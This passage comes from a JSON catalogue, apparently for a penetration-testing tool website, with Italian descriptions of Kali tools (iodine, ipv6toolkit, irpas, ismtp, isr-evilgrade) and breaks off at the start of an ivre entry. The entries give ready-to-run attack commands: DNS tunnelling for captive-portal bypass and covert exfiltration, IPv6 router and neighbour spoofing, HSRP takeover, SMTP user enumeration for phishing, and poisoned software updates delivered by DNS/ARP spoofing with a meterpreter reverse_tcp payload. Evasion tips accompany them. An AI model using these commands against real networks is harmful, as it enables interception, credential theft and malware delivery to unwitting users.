    "repo": "https://www.kali.org/tools/iodine/",
    "desc": "Tunnel IP over DNS per bypassare captive portal e firewall che permettono query DNS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Iodine</strong> è lo strumento di riferimento per creare tunnel IP-over-DNS, permettendo di bypassare captive portal, firewall restrittivi e reti che bloccano tutto il traffico eccetto le query DNS. Il principio di funzionamento sfrutta il fatto che quasi tutte le reti permettono query DNS (porta UDP 53) per la risoluzione dei nomi: Iodine incapsula pacchetti IP completi all'interno di query e risposte DNS, creando un tunnel trasparente che può trasportare qualsiasi traffico TCP/UDP. Il sistema richiede un server Iodine su un host con IP pubblico e un dominio con record NS che punta a quel server. Il client invia query DNS per sottodomini del tipo 'encoded-data.tunnel.yourdomain.com', il server DNS autoritativo (iodined) decodifica i dati e risponde con altri dati encoded nelle risposte. Raggiunge throughput di 500+ Kbps con bassa latenza su connessioni buone.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Full IP Tunnel over DNS:</strong> A differenza di altri tool che tunnelano solo specifici protocolli, Iodine crea un'interfaccia TUN completa che può trasportare qualsiasi traffico IP. Una volta stabilito il tunnel, puoi routare tutto il traffico internet attraverso di esso, inclusi TCP, UDP, ICMP. Supporta MTU configurabile fino a 1200 byte per ottimizzare il throughput.</p><p><strong>Multiple Encoding Schemes:</strong> Supporta diversi encoding per i dati nelle query DNS: Base32 (compatibile ovunque), Base64 (più efficiente ma alcuni DNS proxy non lo supportano), Base64url, Base128. L'auto-probing all'avvio testa automaticamente quale encoding funziona meglio attraverso la specifica rete e sceglie quello ottimale per massimizzare throughput.</p><p><strong>DNS Proxy Bypass:</strong> Molte reti forzano le query DNS attraverso proxy che modificano o filtrano le risposte. Iodine può usare query NULL, PRIVATE, TXT, SRV, MX, CNAME, o A per trovare quale tipo passa attraverso i proxy senza essere modificato. Supporta anche modalità raw per connessioni UDP dirette quando il DNS locale è raggiungibile.</p><p><strong>Authentication e Compression:</strong> Password-based authentication tra client e server per prevenire uso non autorizzato. Compressione LZO opzionale per aumentare il throughput effettivo. Supporta multiple client simultanei sullo stesso server con subnet configurabile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP SERVER (VPS con IP pubblico) ===\n# Prerequisito: dominio con record NS che punta al VPS\n# tunnel.yourdomain.com NS -> vps.yourdomain.com\n# vps.yourdomain.com A -> IP_DEL_VPS\n\n# Avvia server (10.0.0.1 sarà l'IP del server nel tunnel)\nsudo iodined -f -c -P secretpassword 10.0.0.1/24 tunnel.yourdomain.com\n\n# Con opzioni avanzate\nsudo iodined -f -c -P password -n auto -l 0.0.0.0 -p 53 10.0.0.1/24 tunnel.yourdomain.com\n\n# === CLIENT ===\n# Connessione base\nsudo iodine -f -P secretpassword tunnel.yourdomain.com\n\n# Specificando DNS server (se DNS locale non funziona)\nsudo iodine -f -P password 8.8.8.8 tunnel.yourdomain.com\n\n# Forzare encoding specifico\nsudo iodine -f -P password -T TXT tunnel.yourdomain.com\n\n# === POST-CONNESSIONE ===\n# Verifica tunnel\nping 10.0.0.1\n\n# SSH attraverso tunnel\nssh user@10.0.0.1\n\n# Route tutto il traffico attraverso tunnel\nsudo ip route add default via 10.0.0.1 dev dns0\n\n# SOCKS proxy via SSH attraverso tunnel\nssh -D 1080 user@10.0.0.1\ncurl --socks5 127.0.0.1:1080 https://ifconfig.me</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Captive Portal Bypass</strong>, in aeroporti, hotel, conferenze e reti WiFi pubbliche che richiedono login o pagamento. Prima del login, il DNS di solito funziona già (per mostrare la pagina di login). Iodine sfrutta questo per creare un tunnel completo bypassando il captive portal. Utile per accesso internet gratuito o per privacy quando non ti fidi della rete.</p><p>Nelle <strong>Red Team Operations</strong>, Iodine è fondamentale per C2 covert communications quando le reti target hanno egress filtering aggressivo. Quasi nessuna rete blocca DNS completamente. Il tunnel può essere usato per exfiltration di dati, reverse shells, o come transport per altri tool. Combina con SSH per crittografia aggiuntiva.</p><p>Per <strong>Firewall Bypass in Ambienti Restrittivi</strong>, reti corporate, guest network, o ambienti regolamentati spesso permettono solo protocolli specifici. Se DNS passa (e quasi sempre passa), Iodine può tunnelare qualsiasi traffico. Utile per accedere a risorse bloccate o per testare l'efficacia delle policy di egress filtering durante assessment.</p><p>Come <strong>Backup Internet Access</strong>, quando viaggi o in situazioni dove la connettività è limitata, avere un server Iodine preconfigurato garantisce un metodo di fallback per accesso internet. La velocità è limitata (pochi hundred Kbps) ma sufficiente per SSH, email, e browsing basilare.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffic Pattern Analysis:</strong> Il traffico Iodine è altamente distinguibile: alto volume di query DNS per sottodomini lunghi con pattern encoded evidenti, dimensioni delle risposte inusuali, e frequenza di query anomala. Qualsiasi monitoraggio DNS sofisticato può identificarlo. Soluzioni EDR e SIEM moderne hanno signature per DNS tunneling.</p><p><strong>Domain Reputation:</strong> Il dominio usato per il tunnel potrebbe essere flaggato e aggiunto a blocklist. Usare domini fresh e non associati all'attività principale. Considerare domini che sembrano legittime CDN o servizi cloud per ridurre sospetti.</p><p><strong>Throughput e Latenza:</strong> Iodine è lento rispetto a VPN tradizionali (tipicamente 100-500 Kbps). La latenza aggiunge round-trip per ogni query DNS. Non adatto per streaming o trasferimenti grandi. Ottimo per shell interattive e piccoli trasferimenti.</p><p><strong>Alternative Detection:</strong> Se DNS over HTTPS (DoH) o DNS over TLS (DoT) sono disponibili, potrebbero essere alternative meno rilevabili. Alcuni ambienti corporate ispezionano anche il DNS - in quel caso Iodine non funzionerà o sarà immediatamente rilevato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "ipv6toolkit",
    "name": "ipv6toolkit",
    "version": "2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ipv6toolkit/",
    "desc": "Suite di tool per security assessment di reti IPv6: scanning, spoofing, MITM.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>IPv6 Toolkit è la suite di sicurezza più completa per assessment e testing di reti IPv6, sviluppata da Fernando Gont. Include oltre 20 tool specializzati che coprono ogni aspetto della sicurezza IPv6: scanning e reconnaissance, attacchi al Neighbor Discovery Protocol (NDP), Router Advertisement spoofing, fragmentation attacks, e evasion di security devices. La rilevanza di questa suite è critica perché la maggior parte delle reti moderne ha IPv6 abilitato di default (spesso senza che gli amministratori ne siano consapevoli), ma i controlli di sicurezza sono quasi esclusivamente focalizzati su IPv4. Questo crea una superficie d'attacco significativa che IPv6 Toolkit permette di esplorare e testare sistematicamente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive IPv6 Scanning (scan6):</strong> Lo scanner più avanzato per IPv6, supporta multiple tecniche di discovery: ICMPv6 echo, TCP SYN, UDP probes. Può enumerare host locali usando NDP, fare scanning di interi prefissi /64 usando tecniche intelligenti (non è possibile fare brute-force di 2^64 indirizzi). Identifica sistemi operativi basandosi su implementation-specific behaviors di IPv6.</p><p><strong>Router Advertisement Attacks (ra6):</strong> Permette di iniettare Router Advertisement malevoli per diventare default gateway della rete, modificare la configurazione DNS dei client (RDNSS), o causare DoS disabilitando la connettività IPv6. Questi attacchi sono particolarmente efficaci perché IPv6 si auto-configura e i client accettano RA da qualsiasi router.</p><p><strong>Neighbor Discovery Manipulation (na6, ns6, ni6):</strong> Suite completa per attacchi al protocollo NDP (equivalente IPv6 di ARP). Permette neighbor cache poisoning per MITM, DoS tramite duplicate address detection attacks, e reconnaissance tramite Node Information queries. Include tool per generare risposte NA spoofate e NS flood.</p><p><strong>Fragmentation Evasion (frag6):</strong> Sfrutta la frammentazione IPv6 per evadere IDS/IPS e firewall. A differenza di IPv4, in IPv6 solo l'host sorgente può frammentare, e molti security device non riassemblano correttamente. Permette di testare la resilienza dei controlli di sicurezza a overlapping fragments e tiny fragments.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANNING ===\n# Scan rete locale via NDP (veloce e completo)\nscan6 -i eth0 -L -e\n\n# Scan prefisso remoto con tecniche intelligenti\nscan6 -i eth0 -d 2001:db8::/64 --tgt-virtual-machines all\n\n# Scan porte TCP su target IPv6\nscan6 -i eth0 -d 2001:db8::1 -p 22,80,443,8080\n\n# Scan con evasion (source address spoofing)\nscan6 -i eth0 -d target -s 2001:db8::dead:beef\n\n# === ROUTER ADVERTISEMENT ATTACKS ===\n# Diventare default router (MITM)\nra6 -i eth0 -A 2001:db8::/64 -L 9000 -R 9000\n\n# RA flood per DoS\nra6 -i eth0 -F --flood-routers 100\n\n# Iniettare DNS server malevolo via RDNSS\nra6 -i eth0 -A 2001:db8::/64 -N 2001:db8::53\n\n# === NEIGHBOR DISCOVERY ATTACKS ===\n# Neighbor Advertisement spoofing (cache poisoning)\nna6 -i eth0 -T 2001:db8::target -E attacker_mac\n\n# NS flood per DoS\nns6 -i eth0 -d 2001:db8::victim -F\n\n# DAD attack (impedire configurazione IP)\nna6 -i eth0 -L -E -W victimsolicited\n\n# === FRAGMENTATION EVASION ===\n# Test IDS bypass con overlapping fragments\nfrag6 -i eth0 -d target -u -p 80 --frag-otype overlap\n\n# Atomic fragments (0 byte payload fragments)\nfrag6 -i eth0 -d target -A\n\n# === ALTRI TOOL ===\n# Path MTU Discovery manipulation\npmtudisc6 -i eth0 -d target\n\n# ICMPv6 redirect attacks\nrd6 -i eth0 -d victim -r malicious_router</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IPv6 Security Assessment</strong>, la maggior parte delle organizzazioni non ha mai testato la propria postura di sicurezza IPv6. IPv6 Toolkit permette di verificare se i sistemi sono vulnerabili a RA spoofing (spesso lo sono), se i firewall filtrano correttamente il traffico IPv6, e se IDS/IPS rilevano attacchi IPv6. È comune trovare reti dove IPv4 è ben protetto ma IPv6 è completamente aperto.</p><p>Durante <strong>Penetration Testing su Reti Dual-Stack</strong>, quando i controlli IPv4 sono solidi, IPv6 Toolkit permette di cercare vie alternative. Attacchi RA possono dare accesso come default gateway senza che i sistemi di sicurezza IPv4-focused lo rilevino. Neighbor cache poisoning funziona spesso anche quando ARP spoofing è mitigato.</p><p>Per <strong>Red Team Operations</strong>, IPv6 rappresenta un canale spesso non monitorato per command and control, lateral movement e data exfiltration. Molte organizzazioni non hanno logging IPv6, non ispezionano traffico IPv6, e non hanno regole firewall IPv6. IPv6 Toolkit aiuta a verificare e sfruttare questi gap.</p><p>Nel <strong>Security Research e IDS Testing</strong>, la fragmentation evasion capabilities permette di testare se i security device riassemblano correttamente i frammenti IPv6. Molti IDS/IPS falliscono su overlapping fragments, tiny fragments, e altre tecniche che IPv6 Toolkit può generare sistematicamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>High Visibility Attacks:</strong> Molti attacchi IPv6 sono intrinsecamente rumorosi. RA spoofing affecta tutti gli host del segmento e può causare instabilità di rete. Neighbor cache poisoning genera traffico anomalo facilmente rilevabile da chi monitora. Alcuni attacchi (RA flood) possono causare DoS involontario.</p><p><strong>Network Disruption Risk:</strong> A differenza di IPv4 dove gli attacchi sono più localizzati, molti attacchi IPv6 hanno impatto broadcast. Un RA malevolo può rompere la connettività di tutti gli host. Testare sempre in ambienti controllati prima di usare in produzione.</p><p><strong>Emerging Monitoring:</strong> Sebbene molte reti non monitorino IPv6, le organizzazioni mature stanno implementando controlli. RA Guard sui switch enterprise mitiga RA spoofing. SEND (Secure Neighbor Discovery) è raro ma esiste. EDR moderni iniziano a monitorare traffico IPv6 anomalo.</p><p><strong>Privilege Requirements:</strong> La maggior parte dei tool richiede raw socket access (root). L'attività sarà loggata nei system log. In ambienti containerizzati potrebbero essere necessarie capabilities specifiche (CAP_NET_RAW, CAP_NET_ADMIN).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "irpas",
    "name": "irpas",
    "version": "0.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/irpas/",
    "desc": "Suite per attacchi su protocolli di routing: CDP, HSRP, IGRP, IRDP spoofing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>IRPAS</strong> (Internet Routing Protocol Attack Suite) è una collezione storica ma ancora rilevante di tool per attacchi su protocolli di routing e discovery di infrastruttura di rete. La suite sfrutta debolezze intrinseche in protocolli progettati per ambienti trusted: CDP (Cisco Discovery Protocol), HSRP (Hot Standby Router Protocol), IGRP (Interior Gateway Routing Protocol), e IRDP (ICMP Router Discovery Protocol). Questi protocolli spesso mancano di autenticazione o usano autenticazione debole, permettendo a un attaccante sulla stessa rete di manipolare routing, diventare gateway, o causare denial of service. Gli attacchi IRPAS operano a Layer 2/3 e possono dare accesso a tutto il traffico di rete, rappresentando una delle forme più potenti di MITM in ambienti enterprise.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CDP Spoofing e Flooding (cdp):</strong> Cisco Discovery Protocol è usato da device Cisco per annunciare la propria presenza. IRPAS può iniettare CDP packets falsi per impersonare switch o router, o floodare la rete con annunci CDP che esauriscono le risorse dei device Cisco (CAM table exhaustion). Rivela anche informazioni sulla topologia di rete dai CDP legittimi catturati.</p><p><strong>HSRP Takeover (hsrp):</strong> Hot Standby Router Protocol fornisce ridondanza del gateway. IRPAS può iniettare HSRP hello con priorità più alta per diventare Active Router, intercettando tutto il traffico destinato al gateway. L'autenticazione HSRP (quando presente) usa password in chiaro facilmente sniffabili. Attacco devastante per MITM su scala enterprise.</p><p><strong>IGRP/EIGRP Route Injection (igrp):</strong> Interior Gateway Routing Protocol (legacy) e il suo successore EIGRP permettono route injection se non autenticati. IRPAS può annunciare route fasulle per redirigere traffico specifico attraverso l'attacker. Particolarmente utile per intercettare traffico verso subnet specifiche senza diventare default gateway.</p><p><strong>IRDP Redirect Attack (irdp):</strong> ICMP Router Discovery Protocol permette agli host di scoprire gateway sulla rete. IRPAS invia IRDP Router Advertisement con priorità alta per diventare default gateway di tutti gli host che supportano IRDP. Meno comune oggi ma ancora presente in alcuni ambienti legacy.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === CDP ATTACKS ===\n# Sniff CDP per info sulla rete\ncdp -i eth0 -v\n\n# CDP flooding (DoS su switch Cisco)\ncdp -i eth0 -n 1000 -r\n\n# Impersona un device Cisco\ncdp -i eth0 -D \"Fake_Switch\" -P \"WS-C3750\" -S \"Cisco IOS\"\n\n# === HSRP TAKEOVER ===\n# Diventa Active Router (MITM)\n# -g: group number (sniffa prima per trovarlo)\n# -p: priority (>100 per vincere)\n# -v: virtual IP da impersonare\nhsrp -i eth0 -g 10 -p 255 -v 192.168.1.1\n\n# Con autenticazione (se sniffata)\nhsrp -i eth0 -g 10 -p 255 -v 192.168.1.1 -a \"cisco\"\n\n# === IRDP REDIRECT ===\n# Annuncia come router con massima preferenza\nirdp -i eth0 -S 192.168.1.100\n\n# Specifica preference level\nirdp -i eth0 -S 192.168.1.100 -p 0x7fffffff\n\n# === IGRP INJECTION ===\n# Annuncia route fasulle\nigrp -i eth0 -a -n 10.0.0.0/8 -g 192.168.1.100\n\n# === POST-EXPLOITATION ===\n# Dopo HSRP takeover, abilita IP forwarding\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# Intercetta traffico con tcpdump/Wireshark\ntcpdump -i eth0 -w capture.pcap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Infrastructure Penetration Testing</strong>, IRPAS è essenziale per testare la sicurezza dei protocolli di routing. Molte reti enterprise usano HSRP/VRRP per ridondanza senza autenticazione. Un test HSRP takeover dimostra immediatamente l'impatto critico e la necessità di implementare MD5 authentication. CDP può rivelare topologia di rete dettagliata.</p><p>Per <strong>Red Team Network Pivoting</strong>, dopo aver compromesso una macchina sulla rete interna, HSRP takeover permette di intercettare tutto il traffico del segmento senza installare agent su ogni host. Ideale per credential harvesting passivo, session hijacking, e reconnaissance del traffico interno. Più stealth di ARP poisoning in alcuni aspetti.</p><p>Nel <strong>Network Segmentation Verification</strong>, IRPAS può testare se VLAN hopping o routing manipulation sono possibili. Verifica che i protocolli di routing siano autenticati e che le trust boundary siano rispettate. Identifica se CDP leak information cross-VLAN o se HSRP group sono condivisi impropriamente.</p><p>Per <strong>Legacy Network Assessment</strong>, molte infrastrutture datate usano ancora IGRP (deprecato) o IRDP. IRPAS può identificare e sfruttare questi protocolli per dimostrare la necessità di upgrade. Anche HSRP version 1 con autenticazione plaintext è ancora comune.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Immediate Network Impact:</strong> Attacchi HSRP e IRDP cambiano il routing per tutti gli host del segmento. L'impatto è immediato e visibile. Un HSRP takeover può causare brevi interruzioni durante la transizione. Se IP forwarding non è configurato correttamente, si causa blackhole di traffico.</p><p><strong>Heavy Logging:</strong> Switch e router Cisco loggano cambiamenti HSRP state, nuovi CDP neighbors, e IGRP route changes. SNMP traps vengono generati. Syslog centrale cattura tutto. Network Operations Center vedrà immediatamente anomalie in ambienti monitorati.</p><p><strong>Potential DoS:</strong> CDP flooding può crashare switch con CAM table limitate. HSRP flapping può causare instabilità. IGRP route injection può creare routing loop. Testare SEMPRE in ambienti controllati prima, e avere rollback plan.</p><p><strong>Modern Mitigations:</strong> Ambienti maturi implementano HSRP MD5 authentication, CDP disabled su porte user, BPDU guard, e EIGRP authentication. Verificare che questi controlli siano effettivamente presenti è lo scopo principale dell'assessment.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "ismtp",
    "name": "ismtp",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ismtp/",
    "desc": "Testa server SMTP per user enumeration tramite VRFY, EXPN e RCPT TO commands.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ISMTP</strong> è uno strumento specializzato per user enumeration su server SMTP, sfruttando comandi standard del protocollo che molti server non disabilitano correttamente. Utilizza tre tecniche principali: VRFY (verify - chiede al server se un utente esiste), EXPN (expand - espande mailing list mostrando i membri), e RCPT TO (recipient - verifica se il server accetta email per un indirizzo). Anche quando VRFY e EXPN sono disabilitati, RCPT TO spesso rivela informazioni basandosi sui codici di risposta differenti tra utenti esistenti e non esistenti. Questo tipo di enumeration è fondamentale nella fase di reconnaissance per costruire liste di target validi per phishing, password spraying, o attacchi mirati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>VRFY Enumeration:</strong> Invia comandi VRFY username@domain e analizza le risposte. Un 250 o 251 indica utente esistente, 550 indica utente sconosciuto. Molti server legacy hanno VRFY abilitato di default. Anche risposte ambigue possono rivelare informazioni tramite timing analysis o differenze sottili nei messaggi di errore.</p><p><strong>EXPN Mailing List Expansion:</strong> Tenta di espandere mailing list e alias. EXPN group@domain può rivelare tutti i membri di una lista di distribuzione, esponendo utenti che non sarebbero altrimenti enumerabili. Particolarmente utile per scoprire alias come 'all-staff', 'developers', 'executives'.</p><p><strong>RCPT TO Enumeration:</strong> La tecnica più affidabile quando VRFY/EXPN sono disabilitati. Simula l'invio di una email con RCPT TO:user@domain e analizza i codici di risposta. Server che accettano per utenti validi ma rifiutano per invalidi permettono enumeration completa. Funziona anche con server che implementano catch-all se i timing differiscono.</p><p><strong>Batch Processing con Wordlist:</strong> Supporta file con liste di username da testare in batch. Combina con wordlist di nomi comuni, pattern aziendali (nome.cognome, iniziale.cognome), e username recuperati da OSINT. Output strutturato per facile parsing e integrazione con altri tool.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === TEST SINGOLI ===\n# Verifica singolo indirizzo\nismtp -h mail.target.com -e admin@target.com\n\n# Solo username (aggiunge dominio automaticamente)\nismtp -h mail.target.com -e admin -d target.com\n\n# === ENUMERATION CON WORDLIST ===\n# Wordlist di username comuni\nismtp -h mail.target.com -l /usr/share/wordlists/users.txt -d target.com\n\n# Metodo RCPT TO (più affidabile)\nismtp -h mail.target.com -l users.txt -d target.com -m RCPT\n\n# Metodo VRFY \nismtp -h mail.target.com -l users.txt -d target.com -m VRFY\n\n# Prova tutti i metodi\nismtp -h mail.target.com -l users.txt -d target.com -m ALL\n\n# === OPZIONI AVANZATE ===\n# Porta non standard\nismtp -h mail.target.com -p 587 -l users.txt -d target.com\n\n# Con STARTTLS\nismtp -h mail.target.com -l users.txt -d target.com --tls\n\n# Output verboso per debug\nismtp -h mail.target.com -l users.txt -d target.com -v\n\n# Rate limiting (delay tra test)\nismtp -h mail.target.com -l users.txt -d target.com --delay 1\n\n# === WORDLIST GENERATION ===\n# Genera wordlist da nomi\nfor name in $(cat names.txt); do\n  echo \"$name\"\n  echo \"${name}@target.com\"\n  echo \"$(echo $name | cut -c1).$(echo $name | cut -d' ' -f2)\"\ndone > userlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pre-Phishing Reconnaissance</strong>, prima di lanciare una campagna di phishing è essenziale verificare quali indirizzi sono validi. Inviare a indirizzi inesistenti genera bounce che possono triggerare alert. ISMTP permette di validare la lista di target, aumentando il success rate e riducendo il rumore.</p><p>Nel <strong>Password Spraying Preparation</strong>, per attacchi password spray (una password, molti utenti) serve una lista accurata di utenti validi. ISMTP enumera utenti SMTP che spesso corrispondono agli utenti di Active Directory. Combina con tool come Ruler o MailSniper per OWA/Exchange password spraying.</p><p>Durante <strong>Email Security Assessment</strong>, verifica se il server SMTP espone informazioni sugli utenti. Un server ben configurato dovrebbe rispondere allo stesso modo per utenti validi e invalidi (non enumerabile). ISMTP aiuta a identificare e documentare questa misconfiguration comune.</p><p>Per <strong>Social Engineering Intelligence</strong>, gli indirizzi email rivelano convenzioni di naming (nome.cognome, iniziale+cognome, etc.). Una volta identificato il pattern, è possibile generare email probabili per altri dipendenti trovati tramite LinkedIn o altre fonti OSINT senza ulteriore enumeration.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Connection Logging:</strong> Ogni connessione SMTP è loggata con IP sorgente. Server enterprise inviano log a SIEM dove pattern di enumeration (molte connessioni, errori sistematici) sono facilmente rilevabili. Usare IP differenti o timing lento per ridurre visibilità.</p><p><strong>Rate Limiting e Blocchi:</strong> Server moderni implementano rate limiting su connessioni e errori. Troppi tentativi falliti possono risultare in blocco temporaneo o permanente dell'IP. Alcuni server hanno greylist che ritardano le risposte a nuovi IP.</p><p><strong>Response Normalization:</strong> Server ben configurati (postfix reject_unverified_recipient, Exchange address book policies) rispondono identicamente per tutti gli indirizzi. In questi casi, enumeration basata su codici di risposta non funziona. Potrebbe essere necessario timing analysis.</p><p><strong>Legal Implications:</strong> SMTP enumeration può essere considerata reconnaissance non autorizzata. Assicurarsi di avere autorizzazione scritta che copre specificamente testing del mail server. Documentare scope e metodi approvati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMTP"
    ],
    "notes": null
  },
  {
    "id": "isr-evilgrade",
    "name": "isr-evilgrade",
    "version": "2.0.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/isr-evilgrade/",
    "desc": "Framework per attacchi su software update: inietta malware in aggiornamenti legittimi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Evilgrade è un framework modulare per exploitare meccanismi di software update insicuri, permettendo l'iniezione di payload malevoli al posto di aggiornamenti legittimi. Il principio sfrutta il fatto che molte applicazioni (specialmente legacy) verificano gli update via HTTP senza signature checking o con verifica debole, permettendo a un attacker in posizione MITM di sostituire il binario legittimo con malware. Evilgrade include moduli pre-configurati per oltre 60 applicazioni popolari tra cui Java, Notepad++, WinRAR, VMware, iTunes, e molti altri. Quando l'applicazione target cerca aggiornamenti, Evilgrade intercetta la richiesta e serve un payload malevolo che l'utente installa credendo sia un update legittimo. Sebbene l'efficacia sia diminuita con l'adozione di HTTPS e code signing, molte applicazioni legacy e ambienti enterprise rimangono vulnerabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Modular Architecture:</strong> Ogni applicazione target ha un modulo dedicato che definisce: URL di update check, pattern di risposta attesi, come servire il payload, e eventuali header o protocolli specifici. Creare nuovi moduli è relativamente semplice analizzando il meccanismo di update dell'applicazione target con un proxy.</p><p><strong>Integrated Web Server:</strong> Evilgrade include un webserver che risponde alle richieste di update, servendo i payload configurati. Gestisce automaticamente i redirect necessari, mime types corretti, e simula le risposte del server di update originale per ingannare l'applicazione.</p><p><strong>Multiple Payload Support:</strong> Supporta qualsiasi tipo di payload: exe, msi, dmg, o custom binaries. I payload vengono serviti con i nomi e le estensioni attese dall'applicazione. Funziona con payload Metasploit, Cobalt Strike, o qualsiasi executable custom.</p><p><strong>DNS/ARP Spoofing Integration:</strong> Progettato per funzionare insieme a tool MITM come ettercap, bettercap, o dnsspoof. Quando il traffico viene rediretto verso Evilgrade (tramite DNS spoofing del dominio di update o ARP poisoning), il framework gestisce automaticamente le richieste di update.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP EVILGRADE ===\n# Avvia la console interattiva\nevilgrade\n\n# Lista tutti i moduli disponibili\nevilgrade> show modules\n\n# Cerca moduli per keyword\nevilgrade> search java\nevilgrade> search notepad\n\n# === CONFIGURA MODULO ===\n# Seleziona un modulo\nevilgrade> configure notepadplus\n\n# Visualizza opzioni del modulo\nevilgrade(notepadplus)> show options\n\n# Imposta il payload malevolo\nevilgrade(notepadplus)> set agent /path/to/payload.exe\n\n# Avvia il server per questo modulo\nevilgrade(notepadplus)> start\n\n# === SETUP MITM (in altro terminale) ===\n# Opzione 1: DNS Spoofing\n# Trova i domini di update dal modulo\nevilgrade(notepadplus)> show vhosts\n# notepad-plus-plus.org\n\n# Spoof DNS con dnsspoof o bettercap\necho \"192.168.1.100 notepad-plus-plus.org\" >> /tmp/hosts\ndnsspoof -i eth0 -f /tmp/hosts\n\n# Opzione 2: ARP Poisoning con ettercap\nettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.50//\n\n# Opzione 3: Bettercap all-in-one\nbettercap -iface eth0 -eval \"set dns.spoof.domains notepad-plus-plus.org; dns.spoof on; arp.spoof on\"\n\n# === MULTI-TARGET ===\n# Configura più moduli simultaneamente\nevilgrade> configure java\nevilgrade(java)> set agent /path/to/java_payload.exe\nevilgrade(java)> start\n\nevilgrade> configure winrar\nevilgrade(winrar)> set agent /path/to/winrar_payload.exe\nevilgrade(winrar)> start\n\n# === GENERAZIONE PAYLOAD ===\n# Con msfvenom\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team Client-Side Attacks</strong>, quando si ha accesso alla rete interna, Evilgrade permette di compromettere workstation senza interazione diretta con gli utenti. Basta aspettare che un'applicazione vulnerabile controlli gli update. Particolarmente efficace in ambienti con molte applicazioni legacy. L'utente vede un prompt di update normale e clicca Install.</p><p>Durante <strong>Security Awareness Training</strong>, Evilgrade è perfetto per dimostrare perché gli update devono essere verificati con signature. Un demo live di update hijacking è molto più impattante di slide teoriche. Mostra concretamente il rischio di software che non usa HTTPS o code signing.</p><p>Nel <strong>Penetration Testing di Software Inventory</strong>, Evilgrade aiuta a identificare quali applicazioni nell'ambiente hanno meccanismi di update insicuri. Anche solo documentare quali software sono vulnerabili (senza eseguire payload) fornisce valore all'assessment.</p><p>Per <strong>Targeted Attacks su Applicazioni Specifiche</strong>, se la reconnaissance mostra che il target usa una specifica versione di software vulnerabile, Evilgrade permette attacchi mirati. Combina con phishing che suggerisce all'utente di controllare gli update per aumentare le probabilità di trigger.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>MITM Requirement:</strong> Evilgrade richiede controllo del traffico di rete. Questo significa ARP poisoning, DNS spoofing, o rogue access point. Tutti metodi che hanno proprie detection surface e possono generare alert di rete.</p><p><strong>Declining Effectiveness:</strong> Molte applicazioni moderne usano HTTPS pinning, code signing, e update framework sicuri (Windows Update, macOS Gatekeeper). Evilgrade è più efficace su software legacy, applicazioni free/open source, e ambienti enterprise con software datato.</p><p><strong>AV/EDR Evasion:</strong> Il payload deve evadere antivirus. Il fatto che venga eseguito come 'update' non bypassa scanning. Genera processo figlio dal processo dell'applicazione che sta 'aggiornandosi', il che può essere un pattern rilevabile.</p><p><strong>Certificate Warnings:</strong> Se l'applicazione usa HTTPS, il MITM richiede certificato falso che può generare warning. Alcune applicazioni hanno hard-coded trust e non accettano certificati self-signed. Testare prima con il modulo specifico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "ivre",
    "name": "ivre",
    "version": "0.9.21",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ivre/",
    "desc": "Framework per raccolta e analisi di dati di network recon con web interface e API.",
